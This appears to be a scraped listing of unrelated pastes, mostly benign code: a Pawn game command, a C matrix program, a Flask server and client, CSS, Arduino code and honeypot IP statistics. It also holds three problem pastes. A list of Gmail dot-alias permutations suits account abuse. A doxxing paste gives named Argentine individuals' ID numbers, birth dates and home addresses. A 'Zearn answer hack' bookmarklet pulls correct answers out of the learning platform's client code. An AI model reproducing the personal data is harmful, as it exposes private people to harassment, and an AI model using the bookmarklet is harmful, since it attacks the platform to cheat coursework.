<a href=""mailto:sonjac.k.eel@gmail.com"">sonjac.k.eel@gmail.com</a>
<a href=""mailto:s.o.nj.ac.k.e.e.l@gmail.com"">s.o.nj.ac.k.e.e.l@gmail.com</a>
<a href=""mailto:s.o.njac.k.eel@gmail.com"">s.o.njac.k.eel@gmail.com</a>
<a href=""mailto:s.on.j.ac.k.e.e.l@gmail.com"">s.on.j.ac.k.e.e.l@gmail.com</a>
<a href=""mailto:s.onj.ac.k.e.e.l@gmail.com"">s.onj.ac.k.e.e.l@gmail.com</a>
<a href=""mailto:s.onja.c.keel@gmail.com"">s.onja.c.keel@gmail.com</a>
<a href=""mailto:so.nj.ac.kee.l@gmail.com"">so.nj.ac.kee.l@gmail.com</a>
<a href=""mailto:s.o.njack.e.e.l@gmail.com"">s.o.njack.e.e.l@gmail.com</a>
<a href=""mailto:s.o.n.ja.c.keel@gmail.com"">s.o.n.ja.c.keel@gmail.com</a>
<a href=""mailto:s.on.j.ack.e.el@gmail.com"">s.on.j.ack.e.el@gmail.com</a>
<a href=""mailto:s.o.n.j.a.c.ke.e.l@gmail.com"">s.o.n.j.a.c.ke.e.l@gmail.com</a>
<a href=""mailto:so.nja.c.k.e.el@gmail.com"">so.nja.c.k.e.el@gmail.com</a>
<a href=""mailto:so.njac.kee.l@gmail.com"">so.njac.kee.l@gmail.com</a>
<a href=""mailto:so.n.ja.c.k.eel@gmail.com"">so.n.ja.c.k.eel@gmail.com</a>
<a href=""mailto:son.ja.ckeel@gmail.com"">son.ja.ckeel@gmail.com</a>
<a href=""mailto:so.nj.ackeel@gmail.com"">so.nj.ackeel@gmail.com</a>
<a href=""mailto:s.o.nj.ack.e.el@gmail.com"">s.o.nj.ack.e.el@gmail.com</a>
<a href=""mailto:s.o.nj.ackeel@gmail.com"">s.o.nj.ackeel@gmail.com</a>
<a href=""mailto:s.on.j.a.c.k.e.e.l@gmail.com"">s.on.j.a.c.k.e.e.l@gmail.com</a>
<a href=""mailto:so.njack.e.el@gmail.com"">so.njack.e.el@gmail.com</a>
<a href=""mailto:s.onja.c.k.eel@gmail.com"">s.onja.c.k.eel@gmail.com</a>
<a href=""mailto:so.n.j.ackeel@gmail.com"">so.n.j.ackeel@gmail.com</a>
<a href=""mailto:s.o.n.ja.c.k.ee.l@gmail.com"">s.o.n.ja.c.k.ee.l@gmail.com</a>
<a href=""mailto:s.on.ja.ckeel@gmail.com"">s.on.ja.ckeel@gmail.com</a>
<a href=""mailto:s.onj.a.cke.e.l@gmail.com"">s.onj.a.cke.e.l@gmail.com</a>
<a href=""mailto:so.n.j.a.c.k.eel@gmail.com"">so.n.j.a.c.k.eel@gmail.com</a>
<a href=""mailto:s.o.n.j.a.cke.el@gmail.com"">s.o.n.j.a.cke.el@gmail.com</a>
<a href=""mailto:so.n.j.a.c.k.e.e.l@gmail.com"">so.n.j.a.c.k.e.e.l@gmail.com</a>
<a href=""mailto:s.o.nja.cke.e.l@gmail.com"">s.o.nja.cke.e.l@gmail.com</a>
<a href=""mailto:so.n.jac.keel@gmail.com"">so.n.jac.keel@gmail.com</a>
<a href=""mailto:son.j.ackee.l@gmail.com"">son.j.ackee.l@gmail.com</a>
<a href=""mailto:sonj.a.c.kee.l@gmail.com"">sonj.a.c.kee.l@gmail.com</a>
<a href=""mailto:s.onjack.eel@gmail.com"">s.onjack.eel@gmail.com</a>
<a href=""mailto:s.o.njack.ee.l@gmail.com"">s.o.njack.ee.l@gmail.com</a>
<a href=""mailto:s.on.jac.keel@gmail.com"">s.on.jac.keel@gmail.com</a>
<a href=""mailto:sonj.a.c.k.eel@gmail.com"">sonj.a.c.k.eel@gmail.com</a>
<a href=""mailto:sonjac.k.ee.l@gmail.com"">sonjac.k.ee.l@gmail.com</a>
<a href=""mailto:s.o.n.ja.c.ke.e.l@gmail.com"">s.o.n.ja.c.ke.e.l@gmail.com</a>
<a href=""mailto:s.o.n.ja.c.ke.el@gmail.com"">s.o.n.ja.c.ke.el@gmail.com</a>
<a href=""mailto:s.o.nja.c.ke.el@gmail.com"">s.o.nja.c.ke.el@gmail.com</a>
<a href=""mailto:sonjac.ke.el@gmail.com"">sonjac.ke.el@gmail.com</a>
<a href=""mailto:son.j.ac.kee.l@gmail.com"">son.j.ac.kee.l@gmail.com</a>
<a href=""mailto:son.j.ack.e.e.l@gmail.com"">son.j.ack.e.e.l@gmail.com</a>
<a href=""mailto:s.onj.ack.ee.l@gmail.com"">s.onj.ack.ee.l@gmail.com</a>
<a href=""mailto:so.n.j.a.cke.el@gmail.com"">so.n.j.a.cke.el@gmail.com</a>
<a href=""mailto:s.onj.a.ck.e.e.l@gmail.com"">s.onj.a.ck.e.e.l@gmail.com</a>
<a href=""mailto:s.on.jack.eel@gmail.com"">s.on.jack.eel@gmail.com</a>
<a href=""mailto:son.ja.ck.ee.l@gmail.com"">son.ja.ck.ee.l@gmail.com</a>
<a href=""mailto:so.nj.a.c.k.e.e.l@gmail.com"">so.nj.a.c.k.e.e.l@gmail.com</a>
<a href=""mailto:so.nj.ack.e.e.l@gmail.com"">so.nj.ack.e.e.l@gmail.com</a>
<a href=""mailto:so.nja.c.ke.e.l@gmail.com"">so.nja.c.ke.e.l@gmail.com</a>
<a href=""mailto:s.onj.a.c.k.ee.l@gmail.com"">s.onj.a.c.k.ee.l@gmail.com</a>
<a href=""mailto:s.onj.ac.ke.e.l@gmail.com"">s.onj.ac.ke.e.l@gmail.com</a>
<a href=""mailto:s.on.j.acke.el@gmail.com"">s.on.j.acke.el@gmail.com</a>
<a href=""mailto:s.o.n.j.a.c.ke.el@gmail.com"">s.o.n.j.a.c.ke.el@gmail.com</a>
<a href=""mailto:s.o.nj.a.ck.e.el@gmail.com"">s.o.nj.a.ck.e.el@gmail.com</a>
<a href=""mailto:so.njac.k.e.e.l@gmail.com"">so.njac.k.e.e.l@gmail.com</a>
<a href=""mailto:s.o.n.j.ack.ee.l@gmail.com"">s.o.n.j.ack.ee.l@gmail.com</a>
<a href=""mailto:s.o.n.j.a.c.k.e.e.l@gmail.com"">s.o.n.j.a.c.k.e.e.l@gmail.com</a>
<a href=""mailto:son.j.a.cke.el@gmail.com"">son.j.a.cke.el@gmail.com</a>
<a href=""mailto:s.o.njack.eel@gmail.com"">s.o.njack.eel@gmail.com</a>
<a href=""mailto:s.o.n.j.ac.k.e.el@gmail.com"">s.o.n.j.ac.k.e.el@gmail.com</a>
<a href=""mailto:s.o.nja.ck.ee.l@gmail.com"">s.o.nja.ck.ee.l@gmail.com</a>
<a href=""mailto:s.o.n.jac.kee.l@gmail.com"">s.o.n.jac.kee.l@gmail.com</a>
<a href=""mailto:so.n.j.a.c.kee.l@gmail.com"">so.n.j.a.c.kee.l@gmail.com</a>
<a href=""mailto:s.o.nja.ckee.l@gmail.com"">s.o.nja.ckee.l@gmail.com</a>
<a href=""mailto:sonj.a.c.k.e.e.l@gmail.com"">sonj.a.c.k.e.e.l@gmail.com</a>
<a href=""mailto:so.n.j.a.ckeel@gmail.com"">so.n.j.a.ckeel@gmail.com</a>
<a href=""mailto:so.n.j.a.c.k.ee.l@gmail.com"">so.n.j.a.c.k.ee.l@gmail.com</a>
<a href=""mailto:s.o.n.ja.ckeel@gmail.com"">s.o.n.ja.ckeel@gmail.com</a>
<a href=""mailto:s.on.ja.cke.el@gmail.com"">s.on.ja.cke.el@gmail.com</a>
<a href=""mailto:so.nja.c.ke.el@gmail.com"">so.nja.c.ke.el@gmail.com</a>
<a href=""mailto:s.o.nj.a.c.kee.l@gmail.com"">s.o.nj.a.c.kee.l@gmail.com</a>
<a href=""mailto:s.o.nj.ack.eel@gmail.com"">s.o.nj.ack.eel@gmail.com</a>
<a href=""mailto:so.njacke.e.l@gmail.com"">so.njacke.e.l@gmail.com</a>
<a href=""mailto:son.ja.c.k.eel@gmail.com"">son.ja.c.k.eel@gmail.com</a>
<a href=""mailto:s.onja.c.k.e.e.l@gmail.com"">s.onja.c.k.e.e.l@gmail.com</a>
<a href=""mailto:sonj.ac.keel@gmail.com"">sonj.ac.keel@gmail.com</a>
<a href=""mailto:son.ja.c.keel@gmail.com"">son.ja.c.keel@gmail.com</a>
<a href=""mailto:s.o.nja.c.k.eel@gmail.com"">s.o.nja.c.k.eel@gmail.com</a>
<a href=""mailto:so.nj.a.c.ke.el@gmail.com"">so.nj.a.c.ke.el@gmail.com</a>"
kGa7Mmhf,Skydive,Diego_Bueno,Pawn,Friday 2nd of June 2023 09:09:19 PM CDT,"COMMAND:skydive(playerid, params[])
{

    SendAdminText(playerid, ""/skydive"", params);
    if (APlayerData[playerid][LoggedIn] == true)
    {
        if (APlayerData[playerid][PlayerLevel] >= 2)
        {	

			new Float:rx, Float:ry, Float:rz;

			GetPlayerPos(playerid, rx, ry, rz);
			SetPlayerPos(playerid,rx, ry, rz+1500);
			GivePlayerWeapon(playerid, 46, 0);
   			GameTextForPlayer(playerid, ""~y~Voa Agora, FDP!!"", 5000, 5);

		}
		else
		{
		SendClientMessage(playerid, 0xFF0000AA, ""{FF0000}Voce nao tem permissao para usar esse comando."");
		}
	}
	return 1;
}
"
dT0WH871,2var,_who___,C,Friday 2nd of June 2023 08:57:19 PM CDT,"#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <limits.h>

int** create_matrix(int n)
{
	int i;
	int** res = calloc(n, sizeof(int*));
	for (i = 0; i < n; i++)
	{
		res[i] = calloc(n, sizeof(int));
	}
	return res;
}

int** rand_gen(int** a, int n)
{
	int i, j;
	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			a[i][j] = rand()%5;
		}
	}
	return a;
}

int** matrix_mul(int n, int** m1, int** m2)
{
	int i, j, k;
	int** res = create_matrix(n);

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			res[i][j] = 0;
			for (k = 0; k < n; k++)
			{
				res[i][j] += m1[i][k] * m2[k][j];
			}
		}
	}
	return res;
}

int** matrix_sum(int n, int** m1, int** m2)
{
	int i, j;
	int** res = create_matrix(n);

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			res[i][j] = m1[i][j] + m2[i][j];
		}
	}
	return res;
}

int main()
{
	double time_spend = 0.0;
	clock_t begin = clock();

	srand(time(NULL));

	int n, i, j;

	scanf_s(""%d"", &n);

	int** matr1 = create_matrix(n);
	int** matr2 = create_matrix(n);

	FILE* F;
	FILE* F1;

	F = fopen(""input.txt"", ""w"");
	F1 = fopen(""output.txt"", ""w"");

	int** matr11 = create_matrix(n);
	matr11 = rand_gen(matr1, n);
	int** matr22 = create_matrix(n);
	matr22 = rand_gen(matr2, n);

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fprintf(F, ""%d "", matr1[i][j]);
			matr1[i][j] = 0;
		}
		fprintf(F, ""\n"");
	}

	fprintf(F, ""\n"");

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fprintf(F, ""%d "", matr2[i][j]);
			matr2[i][j] = 0;
		}
		fprintf(F, ""\n"");
	}


	fclose(F);

	F = fopen(""input.txt"", ""r"");

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fscanf(F, ""%d"", &matr1[i][j]);
		}
	}

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fscanf(F, ""%d"", &matr2[i][j]);
		}
	}

	matr11 = matrix_mul(n, matr1, matr2);
	matr22 = matrix_sum(n, matr1, matr2);

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fprintf(F1, ""%d "", matr11[i][j]);
		}
		fprintf(F1, ""\n"");
	}

	fprintf(F1, ""\n"");

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			fprintf(F1, ""%d "", matr22[i][j]);
		}
		fprintf(F1, ""\n"");
	}

	int min = INT_MAX;
	int x, y, count = 0;

	for (i = 0; i < n; i++)
	{
		for (j = 0; j < n; j++)
		{
			if (matr1[i][j] < min)
			{
				min = matr1[i][j];
				x = i;
				y = j;
			}
			if (matr1[i][j] % 2 == 0)
			{
				count++;
			}
		}
	}

	printf(""coord %d %d\n"", x, y);
	printf(""nechet %d \n"", count);

	for (i = 0; i < n; i++)
	{
		free(matr1[i]);
		free(matr2[i]);
		free(matr11[i]);
		free(matr22[i]);
	}
	free(matr1);
	free(matr2);
	free(matr11);
	free(matr22);

	clock_t end = clock();
	time_spend += (double)(end - begin) / CLOCKS_PER_SEC;
	printf(""time by echpochmak= %lf"", time_spend);
	return 0;
}"
JTCDwRuV,mydemo,sriyanto,HTML,Friday 2nd of June 2023 08:22:42 PM CDT,"<!DOCTYPE html>
<html>

<head>
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width"">
  <title>Animated Background</title>
  <link href=""style.css"" rel=""stylesheet"" type=""text/css"" />
</head>

<body>
  <div class=""context"">
        <h1>Welcome to Brightchamp's<br> Animated Background Loader</h1>
    </div>


<div class=""area"" >
    <ul class=""circles"">
      <li></li> 
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
      <li></li>   
    </ul>
</div >
  </body>
</html>"
az8DCAUP,Delays via millis wraparound test,gm310509,C++,Friday 2nd of June 2023 08:00:38 PM CDT,"void outputCountdown(char *lbl, 
    unsigned long currMillis,
    unsigned long prevMillis,
    unsigned long interval) {


  Serial.print('\n');Serial.println(lbl);
  Serial.print(""Count from: "");
  Serial.print(prevMillis);
  Serial.print("", interval: "");
  Serial.println(interval);
  Serial.print(""target millis: "");
  Serial.println(prevMillis + interval);

  unsigned long elapsed;
  do {
    currMillis++;
    elapsed = currMillis - prevMillis;
    Serial.print(""curr: "");
    Serial.print(currMillis);
    Serial.print("", elapsed: "");
    Serial.print(elapsed);
    Serial.println(elapsed >= interval ? "" Expired"" : ""..."");
    delay(100);
  } while (elapsed < interval);
}

void setup() {
  Serial.begin(115200);

    // Parameters: lable, currentMillis, previous millis, interval);
  outputCountdown(""wrap: "", 0xFFFFFFF8, 0xFFFFFFF8, 16);
  outputCountdown(""plain: "", 25, 25, 10);
}

void loop() {
  // put your main code here, to run repeatedly:

}"
VeYPuf39,Nuthost - Nutmailer - Leandro Antonio Capurro - Spam - Estafa [6-1/2023],bombaires,HTML,Friday 2nd of June 2023 07:48:17 PM CDT,"Con foto de Leandro Capurro

https://cutt.us/sl6nW (mas info y formulario, pega este enlace en tu navegador)

Nuthost srl - Nutmailer

   nuthost.com - nuthost.com.ar - nuthost.info - nuthost.net - nutmailer.com.ar - servidoraweb.net - transmitterhost.com.ar - emailmkt.xyz - beneficiosnuthost.com - ipdenavegacion.com.ar
   Real names - Los nombre reales: Leandro Rubén Capurro - Esteban Eduardo Ferriol - David Martin Guevara Quispe - Carlos Jaime Castelnuovo - Valentina Lipszyc - Diego Medrano - Pablo Solis - Francisco Rieiro
   CUIT (Leandro Rubén Capurro): 20-26200067-3
   DNI (Leandro Rubén Capurro): 26.200.067
   Date of birth - Fecha de nacimiento (Leandro Rubén Capurro): 9/1/1977
   CUIT (Esteban Eduardo Ferriol): 20-26348747-9
   DNI (Esteban Eduardo Ferriol): 26.348.747
   Date of birth - Fecha de nacimiento (Esteban Eduardo Ferriol): 11/26/1977
   CUIT (Carlos Jaime Castelnuovo): 23-05374522-9
   DNI (Carlos Jaime Castelnuovo): 05.374.522
   Date of birth - Fecha de nacimiento (Carlos Jaime Castelnuovo): 8/13/1939
   Physical address - Dirección real: José Antonio Cabrera 4026 - Palermo
   Alberti 559, Piso 3 Q - B8118ABK Cabildo (Leandro Rubén Capurro private)
   Avenida La Plata 555, Piso 1 9 - C1235ABC Almagro (Esteban Eduardo Ferriol private)
   Phone - Teléfono: +54 (0)11 4863-8889
   +54 (0)810 999-4678
   Leandro Rubén Capurro leandro@nuthost.com
   info@nuthost.com
   ceo@nuthost.com
   rrhh@nuthost.com
   soporte@nuthost.com
   ventas@nuthost.com
   pagos@nuthost.com
   ventas.especiales@nuthost.com
   marketing@nuthost.com
   abuse@nuthost.com
   info@transmitterhost.com.ar
   correomkt@yahoo.com.ar
   envios1@emailmkt.xyz"
4vwKnj8q,server web con form,teslariu,Python,Friday 2nd of June 2023 07:44:41 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
# python -m pip install Flask
#
# Servidor web que almacene alumnos con id y cursos
""""""
alumnos = [
    {'id':1, 'nombre':'Pepe', 'cursos':34},
    {'id':2, 'nombre':'Ana', 'cursos':5},
]
""""""

from flask import Flask, jsonify, request

# creo la lista para almacenar alumnos
alumnos = []

# creo la página web del formulario
formulario_html = """"""
<!DOCTYPE html>
<html>
<head><meta charset='utf-8'></head>
<body>
    <form method='POST'>
        Nombre:<br>
        <input type=""text"" name=""nombre""><br>
        Cursos:<br>
        <input type=""number"" name=""cursos""><br>
        <br><br>
        <input type=""submit"" value=""Enviar"">
    </form>
</body>
</html>
""""""

def salida_html(mensaje):
    return f""""""
    <!DOCTYPE html>
    <html>
        <head>
            <meta charset='utf-8'>
            <title>Formulario</title>
            <meta http-equiv=""refresh"" content=""3"";URL=""http://localhost:5000/form""
        </head>
        <body>{mensaje}</body>
    </html>
    """"""



# creo la página web
app = Flask(__name__)


# creo el 'index.html'
@app.route('/')
def index():
    return ""<h1><strong><em>Hola</em> a todos</strong></h1>""
  
  
  
    
# creo un formulario web para ingresar datos
@app.route('/form', methods=['GET', 'POST'])
def formulario():
    if request.method == ""GET"":
        return formulario_html.encode('utf-8')

    elif request.method == ""POST"":
        try:
            body = dict(request.form)
        except Exception:
            pass
        else:
            if body['nombre'] and body['cursos']:
                if not alumnos:
                    id_alumno = 1
                else:
                    id_alumno = alumnos[-1]['id'] + 1
                print(f""""""
                datos del alumno añadido:
                ----------------------------
                ID: {id_alumno}
                Nombre: {body['nombre']}
                Cursos: {body['cursos']}
                ----------------------------
                """""")
                
                # guardo los datos
                alumno = {
                    'id':id_alumno,
                    'nombre':body['nombre'],
                    'cursos':body['cursos']
                }
                alumnos.append(alumno)
                mensaje = ""Datos guardados""
            
            else:
                mensaje = ""Datos incompletos""
            
            return salida_html(mensaje).encode('utf-8')
    
    


@app.route('/alumno', methods=['GET','POST','DELETE','PUT'])
def alumno():
    
    if request.method == ""GET"":
        return jsonify({""alumnos"":alumnos})
        
    
    elif request.method == ""POST"":
        if not alumnos:
            id_alumno = 1
        else:
            id_alumno = alumnos[-1]['id'] + 1
        alumno = {
            'id': id_alumno,
            'nombre': request.json['nombre'],
            'cursos': request.json['cursos'],
        }
        alumnos.append(alumno)
        return jsonify(""Alumno añadido"")

    
    elif request.method == ""PUT"":
        id_alumno = request.json['id']
        for alumno in alumnos:
            if id_alumno == alumno.get('id'):
                if request.json['nombre']:
                    alumno['nombre'] = request.json['nombre']
                if request.json['cursos']:
                    alumno['cursos'] = request.json['cursos']
                return jsonify(f""Datos del alumno id={id_alumno} modificado"")
        return jsonify(f""Alumno id={id_alumno} no encontrado"")
        
    
    elif request.method == ""DELETE"":
        id_alumno = request.json['id']
        for alumno in alumnos:
            if id_alumno == alumno.get('id'):
                alumnos.remove(alumno)
                return jsonify(f""Alumno id={id_alumno} borrado"")
        return jsonify(f""Alumno id={id_alumno} no encontrado"")
        
        
@app.route('/alumno/<int:i>')
def get_alumno(i):
    try:
        return jsonify({""alumno"":alumnos[i-1]})
    except IndexError:
        return jsonify(f""Alumno id={i} no encontrado"")
        




@app.route('/admin')
def admin():
    return ""<h1><strong>En construcción</strong></h1>""



    
if __name__ == ""__main__"":
    app.run(debug=True)
    
""""""
LINUX:
export FLASK_APP=webserver.py
flask run

WINDOWS:
set FLASK_APP=webserver.py
flask run
""""""    

"
TQwkxYyk,mycss,sriyanto,CSS,Friday 2nd of June 2023 07:25:27 PM CDT,"@import url('https://fonts.googleapis.com/css?family=Exo:400,700');
*{
    margin: 0px;
    padding: 0px;
}

body{
    font-family: 'Exo', sans-serif;
}

.context {
    width: 100%;
    position: absolute;
    top:50vh;  
}

.context h1{
    text-align: center;
    color: #fff;
    font-size: 50px;
}

.area{ 
    width: 100%;
    height:100vh;
    -webkit-animation:bgcolorchange 20s infinite alternate;
}

.circles{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

.circles li{
    position: absolute;
    display: block;
    list-style: none;
    width: 20px;
    height: 20px;
    background: rgba(255, 255, 255, 0.2);
    animation: animate 5s linear infinite;
    bottom: -150px;
}

.circles li:nth-child(1){
    left: 25%;
    width: 80px;
    height: 80px;
    animation-delay: 0s;
}

.circles li:nth-child(2){
    left: 10%;
    width: 20px;
    height: 20px;
    animation-delay: 2s;
    animation-duration: 12s;
}

.circles li:nth-child(3){
    left: 70%;
    width: 20px;
    height: 20px;
    animation-delay: 4s;
}

.circles li:nth-child(4){
    left: 40%;
    width: 60px;
    height: 60px;
    animation-delay: 0s;
    animation-duration: 18s;
}

.circles li:nth-child(5){
    left: 65%;
    width: 20px;
    height: 20px;
    animation-delay: 0s;
}

.circles li:nth-child(6){
    left: 75%;
    width: 110px;
    height: 110px;
    animation-delay: 3s;
}

.circles li:nth-child(7){
    left: 35%;
    width: 150px;
    height: 150px;
    animation-delay: 7s;
}

.circles li:nth-child(8){
    left: 50%;
    width: 25px;
    height: 25px;
    animation-delay: 15s;
    animation-duration: 45s;
}

.circles li:nth-child(9){
    left: 20%;
    width: 45px;
    height: 45px;
    animation-delay: 2s;
    animation-duration: 35s;
}

.circles li:nth-child(10){
    left: 85%;
    width: 150px;
    height: 150px;
    animation-delay: 0s;
    animation-duration: 11s;
}

@keyframes animate {

    0%{
        transform: translateY(0) rotate(0deg);
        opacity: 1;
        border-radius: 0;
        background: #ffea00;       
    }

    100%{
        transform: translateY(-1000px) rotate(720deg);
        opacity: 0;
        border-radius: 50%;
        background: #fdfa9b;     
    }
}

@-webkit-keyframes bgcolorchange {
      0% { 
      background-color: #7904a4;
      }
      10% { 
        background-color: #8e44ad;
      }
      20% {  
        background-color: #1abc9c;
      }
      30% { 
        background-color: #d35400;
      }
      40% {
        background-color: blue;
      }
      50% {
        background-color: #34495e;
      }
      60% {
        background-color: blue;
      }
      70% { 
        background-color: #2980b9;
      }
      80% {
        background-color: #0ef1b8;
      }
      90% {
        background-color: #2980b9;
      }
      100% { 
        background-color: pink;
      }
    }
"
yYXvJ7vj,Zearn answer hack(tower of power and learning lab),BenSyt,JavaScript,Friday 2nd of June 2023 07:24:57 PM CDT,"//copy start
javascript:function a(){var PopupMenu=function(){var e=!1,t=0,n=0;return{create:function(o){var s,l=document.createElement(""div"");l.className=""popup-menu"",l.style.position=""fixed"",l.style.fontSize=""125%"",l.style.top=""50%"",l.style.left=""50%"",l.style.transform=""translate(-50%, -50%)"",l.style.background=""#ffffff"",l.style.padding=""10px"",l.style.border=""1px solid #cccccc"",l.style.borderRadius=""5px"",l.style.boxShadow=""0 2px 5px rgba(0, 0, 0, 0.3)"",l.style.zIndex=""9999"",l.style.cursor=""move"",(s=l).addEventListener(""mousedown"",(function(o){e=!0,t=o.clientX-s.offsetLeft,n=o.clientY-s.offsetTop,document.body.style.userSelect=""none"",document.body.style.webkitUserSelect=""none"",document.body.style.MozUserSelect=""none"",document.body.style.msUserSelect=""none""})),document.addEventListener(""mousemove"",(function(o){e&&(s.style.left=o.clientX-t+""px"",s.style.top=o.clientY-n+""px"")})),document.addEventListener(""mouseup"",(function(){e=!1,document.body.style.userSelect="""",document.body.style.webkitUserSelect="""",document.body.style.MozUserSelect="""",document.body.style.msUserSelect=""""}));var r=document.createElement(""ol"");function c(){for(;r.firstChild;)r.firstChild.remove();o.forEach((function(e){var t=document.createElement(""li"");t.textContent=e,r.appendChild(t)}))}return c(),l.appendChild(r),document.body.appendChild(l),{editList:function(e){o=e,c()}}}}}();let popup=PopupMenu.create([""Click on a task for answers.""]);function vueHandler(){const e=document.getElementsByClassName(""task-group"").length;return document.getElementsByClassName(""task-group"")[e-1].__vue__.$children[0]}function inputAnswers(e){window.t=e;let t=e.correctVals[0][Object.keys(e.correctVals[0])];if(""super_multiple_choice""===e._props.taskType)t=[e.correctVals[0].answer],document.querySelectorAll(""label[data-val]"").forEach((function(e){parseInt(e.dataset.val)===parseInt(t[0])&&(e.style.backgroundColor=""lightgreen"")}));else if(""super_categorize""===e._props.taskType)return t=e.correctVals[0].indices,document.querySelectorAll(""div[data-id]"").forEach((function(e){e.children[0].innerHTML=e.dataset.id})),void popup.editList(t);if(""coordinate_plane_plot""===e._props.taskType){e.correctPoints.forEach(function(a){e.togglePoint(a);});popup.editList(e.correctPoints);return;}if(""super_label_an_image""===e._props.taskType){label();popup.editList(e.correctVals[0].correct_indices);return;}else if(console.log(t),""super_label_a_sentence""===e._props.taskType)return label(),void popup.editList(t);if(""multiple_select""!==e._props.taskType){if(""super_fill_in""!==e._props.taskType)return void popup.editList([""This is an unsupported task type. Here are the correct vals: ""+JSON.stringify(e.correctVals)]);t=e.correctVals[0].answers,popup.editList(t);for(let n=0;n<t.length;n++)e.setInputValues({taskId:e.taskId,inputIdx:n,offset:0,values:t[n].toString().split("" "").join("""")})}else document.querySelectorAll(""div[data-val]"").forEach((function(e){t.includes(parseInt(e.dataset.val))&&(e.style.backgroundColor=""lightgreen"")}))}function label(){document.querySelectorAll(""[data-originslot]"").forEach(function(e){if(e.__vue__.$options.propsData.token){e.querySelector(""span"").innerHTML=e.__vue__.$options.propsData.token.tile.originalIdx;}})}function click(){if(vueHandler()){if(vueHandler().$children[0].used)return;vueHandler().$children.forEach((function(e){e.$options.propsData.taskId&&e.$el.addEventListener(""click"",(function(t){inputAnswers(e)}))})),vueHandler().$children[0].used=!0}click()}setInterval(click,1e3);}a();
//copy end
//Works on multiple choice, list, multiple select, and tries to tell you the answers for any unknown task type. If it doesn't work, tell me in the comments."
hCXUbpik,web_client,teslariu,Python,Friday 2nd of June 2023 07:17:14 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import requests
url = ""http://localhost:5000/alumno""
 
while True:
    print(""""""
    Administración de alumnos
    ---------------------------
    1. Agregar un alumno
    2. Modificar un alumno
    3. Listar alumnos
    4. Eliminar un alumno
    5. Salir
    """""")
    opcion = input(""Seleccione una opción: "")
    
    if opcion == ""1"":
        nombre = input(""Ingrese el nombre: "")
        cursos = int(input(""Ingrese la cantidad de cursos: ""))
        r = requests.post(url, json={'nombre':nombre, 'cursos':cursos})
        print(""Server response code: "", r.status_code)
        print(""Server response content: "", r.json())
    
    
        
    elif opcion == ""2"":
        id_alumno = int(input(""Ingrese el ID: ""))
        datos = {'id':id_alumno, 'nombre':None, 'cursos':None}
        cambio = input(""¿Desea cambiar el nombre? (s/N): "")
        if cambio.lower() == 's':
            datos['nombre'] = input(""Ingrese el nuevo nombre: "")
        cambio = input(""¿Desea cambiar la cantidad de cursos? (s/N): "")
        if cambio.lower() == 's':
            datos['cursos'] = int(input(""Ingrese la cantidad de cursos: ""))
        r = requests.put(url, json=datos)
        print(""Server response code:"", r.status_code)
        print(""Server response content: "", r.json())
        
        
    elif opcion == ""3"":
        r = requests.get(url)
        if r.status_code == 200:
            alumnos = r.json()['alumnos']
            if alumnos:
                print(""Lista de alumnos"")
                print(""----------------"")
                for alumno in alumnos:
                    print(alumno)
            else:
                print(""No hay alumnos inscriptos"")
        else:
            print(""No se pudo descargar la lista de alumnos"")
            print(""Server response code: "", r.status_code)
    
    
            
    elif opcion == ""4"":
        id_alumno = int(input(""Ingrese el ID: ""))
        datos = {'id':id_alumno}
        r = requests.delete(url, json=datos)
        print(""Server response code:"", r.status_code)
        print(""Server response content: "", r.json())
        
    elif opcion == ""5"":
        print(""Finalizando sesión...."")
        break
        
    else:
        print(""Opción no disponible"")
"
y16suM6S,2023-06-02_stats.json,rdp_snitch,JSON,Friday 2nd of June 2023 07:15:10 PM CDT,"{
  ""ip"": {
    ""162.241.158.17"": 27,
    ""176.111.174.184"": 10,
    ""45.227.254.49"": 2,
    ""167.94.138.33"": 1,
    ""185.11.61.238"": 1,
    ""87.251.75.145"": 4,
    ""146.70.166.100"": 1,
    ""167.94.146.60"": 1,
    ""59.29.25.155"": 7,
    ""194.165.16.37"": 2,
    ""103.236.108.238"": 11,
    ""45.143.201.62"": 6,
    ""185.170.144.3"": 2,
    ""123.57.58.91"": 15,
    ""87.251.75.120"": 2,
    ""8.217.77.182"": 5,
    ""194.165.16.73"": 2,
    ""185.11.61.199"": 4,
    ""194.26.135.80"": 2,
    ""87.251.64.110"": 4,
    ""194.26.135.176"": 2,
    ""91.240.118.11"": 4,
    ""194.26.135.79"": 2,
    ""120.55.14.18"": 5,
    ""181.118.174.215"": 1,
    ""98.143.255.25"": 2,
    ""91.193.232.217"": 1,
    ""146.70.172.251"": 2,
    ""193.169.255.78"": 6,
    ""198.235.24.218"": 3,
    ""193.169.255.152"": 4,
    ""120.27.12.65"": 9,
    ""45.43.2.139"": 1,
    ""45.227.254.54"": 4,
    ""170.64.140.20"": 1,
    ""202.55.135.116"": 2,
    ""87.251.75.64"": 1,
    ""45.56.67.13"": 1,
    ""179.43.152.50"": 1,
    ""167.94.138.126"": 1,
    ""45.135.201.65"": 4,
    ""51.75.160.42"": 2,
    ""124.220.218.111"": 4,
    ""205.210.31.93"": 3
  },
  ""asn"": {
    ""AS19871"": 27,
    ""AS57523"": 25,
    ""AS267784"": 6,
    ""AS398324"": 2,
    ""AS208091"": 7,
    ""AS9009"": 3,
    ""AS398705"": 1,
    ""AS4766"": 7,
    ""AS48721"": 4,
    ""AS132925"": 11,
    ""AS210950"": 6,
    ""AS48080"": 6,
    ""AS37963"": 29,
    ""AS45102"": 5,
    ""AS23416"": 1,
